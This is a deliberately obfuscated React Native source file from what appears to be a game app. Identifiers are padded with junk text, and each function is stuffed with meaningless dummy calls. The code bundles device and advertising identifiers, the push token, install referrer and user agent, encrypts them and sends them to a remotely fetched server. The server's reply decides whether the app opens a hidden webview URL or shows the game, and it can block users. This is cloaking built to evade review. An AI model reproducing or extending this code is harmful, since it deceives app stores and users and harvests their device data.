import {
  Utils,
  luckkmyvjibmehsuSendInitPayload,
  luckkmyvjibmehsuNormalizeWorkerBaseUrl,
} from './UtluckkmyvjibmehsuilService';
import {
  luckkmyvjibmehsuEncrypt as cryptoEncrypt,
  luckkmyvjibmehsuDecrypt as cryptoDecrypt,
} from './CrypluckkmyvjibmehsutoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finluckkmyvjibmehsuKey } from './constants/constluckkmyvjibmehsuntsVariable';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {
  InitializationState,
  luckkmyvjibmehsuInitTarget,
  luckkmyvjibmehsuAppenndSendId,
  luckkmyvjibmehsuGetAndroidId,
  luckkmyvjibmehsuGetAndroidUserAAgent,
  luckkmyvjibmehsuGetAppIdenier,
  luckkmyvjibmehsuGetAppVersion,
  luckkmyvjibmehsuInitializationRuntime,
} from './initializationSharluckkmyvjibmehsued';
import { luckkmyvjibmehsuViewportShow } from './luckkmyvjibmehsuViewportHost';
// autosetup-split-begin
import { luckkmyvjibmehsuOfferResolvObfV1HashMix, luckkmyvjibmehsuMixSeed, luckkmyvjibmehsuOffObfV3SumOdds, luckkmyvjibmehsuOffObfV4SumOdds, luckkmyvjibmehsuOfferResolvObfV2HashMix, luckkmyvjibmehsuOfferResolvObfV1ClampMod, luckkmyvjibmehsuFoldRange, luckkmyvjibmehsuOffObfV3ClampMod, luckkmyvjibmehsuOffObfV4ClampMod, luckkmyvjibmehsuOfferResolvObfV2ClampMod, luckkmyvjibmehsuOfferResolvObfV2SumOdds, luckkmyvjibmehsuOffObfV3HashMix, luckkmyvjibmehsuOffObfV4HashMix, luckkmyvjibmehsuOfferResolvObfV1SumOdds, luckkmyvjibmehsuClampSpan, luckkmyvjibmehsuOfferResolveObfV5HashMix, luckkmyvjibmehsuOfferResolveObfV5SumOdds, luckkmyvjibmehsuOfferResolveObfV5ClampMod, luckkmyvjibmehsuOfferResolveObfV6HashMix, luckkmyvjibmehsuOfferResolveObfV6SumOdds, luckkmyvjibmehsuOfferResolveObfV6ClampMod } from './luckkmyvjibmehsuOfferResolvePart01';
// autosetup-split-end

export async function luckkmyvjibmehsuInitStep(): Promise<InitializationState | null> {
  void luckkmyvjibmehsuOfferResolveObfV5HashMix('xy');
  void luckkmyvjibmehsuOfferResolveObfV5SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolveObfV5ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolveObfV6HashMix('xy');
  void luckkmyvjibmehsuOfferResolveObfV6SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolveObfV6ClampMod(7, 5);
  void luckkmyvjibmehsuOffObfV3HashMix('xy');
  void luckkmyvjibmehsuOffObfV3SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOffObfV3ClampMod(7, 5);
  void luckkmyvjibmehsuOffObfV4HashMix('xy');
  void luckkmyvjibmehsuOffObfV4SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOffObfV4ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
  void luckkmyvjibmehsuMixSeed(3, 7);
  void luckkmyvjibmehsuFoldRange([1, 2, 3]);
  void luckkmyvjibmehsuClampSpan(5, 0, 10);

  void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
  try {
    const primaryWorkerUrl = await Utils.luckkmyvjibmehsuGetLink();
    if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const appId = await luckkmyvjibmehsuGetAppIdenier();
    const userAgent = await luckkmyvjibmehsuGetAndroidUserAAgent();
    const androidId = await luckkmyvjibmehsuGetAndroidId();
    const appVersion = await luckkmyvjibmehsuGetAppVersion();
    const workerBaseUrl = luckkmyvjibmehsuNormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = luckkmyvjibmehsuInitializationRuntime.DevluckkmyvjibmehsuiceId;

    const namingValue = luckkmyvjibmehsuInitializationRuntime.FinluckkmyvjibmehsulNaming;

    const cookieRaw = [
      appId ?? '',
      payloadDeviceId ?? '',
      luckkmyvjibmehsuInitializationRuntime.adluckkmyvjibmehsuId ?? '',
      luckkmyvjibmehsuInitializationRuntime.pusluckkmyvjibmehsuhToken ?? '',
      luckkmyvjibmehsuInitializationRuntime.instluckkmyvjibmehsuallRef ?? '',
      luckkmyvjibmehsuInitializationRuntime.FinluckkmyvjibmehsulOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ].join('|');

    const encryptedCookie = cryptoEncrypt(cookieRaw);
    const dataValue = encodeURIComponent(encryptedCookie);
    const cookieHeader = `data=${dataValue}`;

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}`;

    const encryptedBody = encodeURIComponent(cryptoEncrypt(bodyPlain));

    try {
      const responseText = await luckkmyvjibmehsuSendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.luckkmyvjibmehsuSetUserBlocke(1);
        await luckkmyvjibmehsuUnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await luckkmyvjibmehsuOnInitResponse(responseText);
    } catch (rpcError) {
      void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
      void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
      void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
      void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
      void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
      void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
      await luckkmyvjibmehsuUnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {
    void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
    void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
    void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
    void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
    void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
    void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
    await luckkmyvjibmehsuUnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function luckkmyvjibmehsuOnInitResponse(responseText: string): Promise<InitializationState> {
  void luckkmyvjibmehsuOfferResolveObfV5HashMix('xy');
  void luckkmyvjibmehsuOfferResolveObfV5SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolveObfV5ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolveObfV6HashMix('xy');
  void luckkmyvjibmehsuOfferResolveObfV6SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolveObfV6ClampMod(7, 5);
  void luckkmyvjibmehsuOffObfV3HashMix('xy');
  void luckkmyvjibmehsuOffObfV3SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOffObfV3ClampMod(7, 5);
  void luckkmyvjibmehsuOffObfV4HashMix('xy');
  void luckkmyvjibmehsuOffObfV4SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOffObfV4ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
  void luckkmyvjibmehsuMixSeed(3, 7);
  void luckkmyvjibmehsuFoldRange([1, 2, 3]);
  void luckkmyvjibmehsuClampSpan(5, 0, 10);

  void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
  try {
    const decrytedResponse = cryptoDecrypt(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = JSON.parse(decrytedResponse);

      redirectUrl = obj.redirectUrl || null;
      redirectUrlInitial = obj.redirectUrlInitial || null;
      errorField = obj.error || null;
      blockUser = !!obj.blockUser;
    } catch (parseError) {
      void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
      void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
      void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
      void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
      void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
      void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.luckkmyvjibmehsuSetUserBlocke(1);
      await luckkmyvjibmehsuUnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.luckkmyvjibmehsuSetUserBlocke(1);
      await luckkmyvjibmehsuUnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finluckkmyvjibmehsuKey, redirectUrlInitial);

      const finalUrl = luckkmyvjibmehsuAppenndSendId(
        redirectUrlInitial,
        luckkmyvjibmehsuInitializationRuntime.penluckkmyvjibmehsudingSendId,
      );

      const success = await luckkmyvjibmehsuViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
      void success;

      return {
        isLoadPlaceholder: false,
        initTarget: luckkmyvjibmehsuInitTarget.webview,
      };
    }

    await luckkmyvjibmehsuUnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: luckkmyvjibmehsuInitTarget.game,
    };
  } catch (error) {
    void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
    void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
    void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
    void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
    void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
    void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
    await luckkmyvjibmehsuUnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function luckkmyvjibmehsuUnsubscribeFirebase(reason?: string): Promise<void> {
  void luckkmyvjibmehsuOfferResolveObfV5HashMix('xy');
  void luckkmyvjibmehsuOfferResolveObfV5SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolveObfV5ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolveObfV6HashMix('xy');
  void luckkmyvjibmehsuOfferResolveObfV6SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolveObfV6ClampMod(7, 5);
  void luckkmyvjibmehsuOffObfV3HashMix('xy');
  void luckkmyvjibmehsuOffObfV3SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOffObfV3ClampMod(7, 5);
  void luckkmyvjibmehsuOffObfV4HashMix('xy');
  void luckkmyvjibmehsuOffObfV4SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOffObfV4ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
  void luckkmyvjibmehsuMixSeed(3, 7);
  void luckkmyvjibmehsuFoldRange([1, 2, 3]);
  void luckkmyvjibmehsuClampSpan(5, 0, 10);

  void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
  void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
  void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
  void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    luckkmyvjibmehsuInitializationRuntime.pusluckkmyvjibmehsuhToken = '';
  } catch (error) {
    void luckkmyvjibmehsuOfferResolvObfV1HashMix('xy');
    void luckkmyvjibmehsuOfferResolvObfV1SumOdds([1, 3, 5]);
    void luckkmyvjibmehsuOfferResolvObfV1ClampMod(7, 5);
    void luckkmyvjibmehsuOfferResolvObfV2HashMix('xy');
    void luckkmyvjibmehsuOfferResolvObfV2SumOdds([1, 3, 5]);
    void luckkmyvjibmehsuOfferResolvObfV2ClampMod(7, 5);
    luckkmyvjibmehsuInitializationRuntime.pusluckkmyvjibmehsuhToken = '';
  }
}
/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v5 */


/* obfuscation-batch:v6 */

